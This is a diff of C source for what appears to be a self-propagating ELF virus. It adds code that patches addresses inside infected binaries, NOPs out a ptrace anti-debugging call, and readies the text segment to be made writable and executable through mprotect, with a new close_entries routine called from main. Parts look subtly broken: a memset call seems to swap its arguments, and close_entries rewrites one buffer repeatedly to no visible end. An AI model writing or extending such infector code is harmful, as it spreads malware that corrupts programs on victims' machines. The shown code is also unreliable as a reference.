@@ -132,8 +132,19 @@ static void	patch_addresses(t_info *info)
 	ft_memcpy(info->file + info->offset_bis + OFFSET_3, &val, 4);
 
 	// &ptrace in main
-	ft_memset(info->file + info->offset_bis + OFFSET_4, 42, '\x90');
-	
+	ft_memset(info->file + info->offset_bis + OFFSET_4 + 1, 41, '\x90');
+
+	// size_text in mprotect_text
+	val = info->text_size + 0x1000;
+	ft_memcpy(info->file + info->offset_bis + OFFSET_5, &val, 4);
+
+	// addr text in mprotect_text
+	start = (size_t)(info->file) + info->addr_bis + OFFSET_5 + 0xb;
+	end = (size_t)(info->file) + info->text_addr;
+	val = end - start;
+	ft_memcpy(info->file + info->offset_bis + OFFSET_5 + 0x7, &val, 4); // 0x3F is pos of instruction targeted in loader
+	val = 0x90;
+	ft_memcpy(info->file + info->offset_bis + OFFSET_5 - 0xd, &val, 1);
 }
 
 static int		reload_mapping(t_info *info)
@@ -303,6 +314,36 @@ static int		infect_dir(char *path)
 	return (0);
 }
 
+void	close_entries(void)
+{
+	char		buf[8];
+	uint32_t	addr_origin;
+	void		*addr_hook;
+
+	mprotect_text(PROT_WRITE | PROT_READ | PROT_EXEC);
+	addr_origin = -1;
+	addr_hook = buf;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -2;
+	addr_hook = buf;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -3;
+	addr_hook = buf;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -4;
+	addr_hook = buf;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+	addr_origin = -5;
+	addr_hook = buf;
+	ft_memcpy(addr_hook, &addr_origin, 4);
+
+// 	mprotect_text(PROT_EXEC | PROT_READ);
+}
+
 int		main()
 {
 	char			buf[BUF_SIZE];
@@ -310,6 +351,8 @@ int		main()
 
 // 	if (ft_sysptrace(0, 0, 1, 0) == -1)
 // 		return (0);
+
+	close_entries();
 	write_proc(buf_path);
 	if ((check_process(buf_path)) == 1)
 		return (0);
